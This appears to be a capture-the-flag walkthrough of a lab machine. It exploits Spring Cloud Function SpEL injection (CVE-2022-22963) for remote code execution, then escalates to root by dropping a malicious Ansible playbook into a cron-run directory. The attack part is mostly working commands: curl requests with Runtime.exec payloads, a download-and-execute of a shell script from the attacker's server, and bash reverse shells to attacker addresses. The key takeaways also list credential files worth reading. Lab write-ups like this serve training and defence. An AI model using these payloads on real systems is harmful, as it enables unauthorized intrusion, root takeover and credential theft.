Phase 2

Initial Access — Spring Cloud Function SpEL Injection (CVE-2022-22963)

CVE-2022-22963 — SpEL injection via routing header Spring Cloud Function allows routing requests to functions via the HTTP header spring.cloud.function.routing-expression. This header value is evaluated as a Spring Expression Language (SpEL) expression — and SpEL can call Java methods like Runtime.getRuntime().exec(). No authentication required.

Verify RCE

$ curl -i -X POST "http://10.129.228.213:8080/functionRouter" \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test.txt\")" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "test"

# Verify with LFI
GET /show_image?img=../../../../../../tmp/test.txt
(empty file returned — confirms execution)

Reverse Shell (3-step method)

# Attacker: prepare shell script + HTTP server
$ cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.65/4444 0>&1
EOF
$ cd /tmp && python3 -m http.server 8888

# Step 1: Download the script
$ curl -i -X POST "http://10.129.228.213:8080/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","curl http://10.10.15.65:8888/shell.sh -o /tmp/shell.sh"})' \
  -H "Content-Type: text/plain" --data "test"

# Step 2: Make executable
$ curl -i -X POST "http://10.129.228.213:8080/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","chmod +x /tmp/shell.sh"})' \
  -H "Content-Type: text/plain" --data "test"

# Step 3: Execute (listener: nc -lnvp 4444)
$ curl -i -X POST "http://10.129.228.213:8080/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"bash","-c","bash /tmp/shell.sh"})' \
  -H "Content-Type: text/plain" --data "test"

frank@inject:/$
Why 3 steps instead of 1? Runtime.exec() doesn't handle shell pipes and redirections (>&, |) directly. The new String[]{"bash","-c","..."} array form helps, but complex payloads with special characters often fail. The reliable pattern: download a script → chmod → execute.

Phase 4

Privilege Escalation — Ansible Playbook Cronjob

Discover the Cronjob

phil@inject:~$ ls -la /opt/automation/tasks/
drwxrwxr-x 2 root staff 4096 ... .
-rw-r--r-- 1 root root  150 ... playbook_1.yml

phil@inject:~$ groups
phil staff

A root cronjob runs ansible-parallel /opt/automation/tasks/*.yml. The directory is writable by the staff group, which phil belongs to.

Writable automation directory = root code execution Root's cronjob executes all .yml files in the directory. Ansible's shell: module runs commands with the privileges of the ansible process — which is root. Since we can write to the directory, we drop a playbook with a reverse shell task and wait for cron to pick it up.

Drop Malicious Playbook

phil@inject:~$ cat > /opt/automation/tasks/playbook_2.yml << 'EOF'
- hosts: localhost
  tasks:
  - name: Checking webapp service
    shell: bash -c 'bash -i >& /dev/tcp/10.10.15.65/6666 0>&1'
EOF

# Wait for cron (check every minute) — listener: nc -lnvp 6666

root@inject:/opt/automation/tasks# cat /root/root.txt
652a5e3dfafe86d363a50bdf06d85325
Race condition Another cronjob periodically clears the directory and restores the original playbook_1.yml. Your malicious playbook must be present when the ansible job fires. If it gets cleaned before execution, just write it again — the window is usually a few minutes.
Appendix

Key Takeaways

LFI is a Swiss Army knife for recon.

Beyond /etc/passwd, read pom.xml for Java versions, settings.xml for credentials, .env for secrets, wp-config.php for DB creds. The file you read determines what attack comes next.

Spring Cloud Function SpEL injection is pre-auth RCE.

CVE-2022-22963: one HTTP header → arbitrary Java code execution. Use the String[] array form of exec() for complex commands, or download-and-execute for reliability.

Maven settings.xml stores credentials in plaintext.

~/.m2/settings.xml is the first place to look on any Java/Maven target. Developers store server passwords here for deployment — they're often reused.

Writable automation directories + root cronjobs = instant escalation.

Ansible, cron, systemd timers — if root executes scripts from a group-writable directory, any member of that group can escalate. Always check groups and directory permissions.
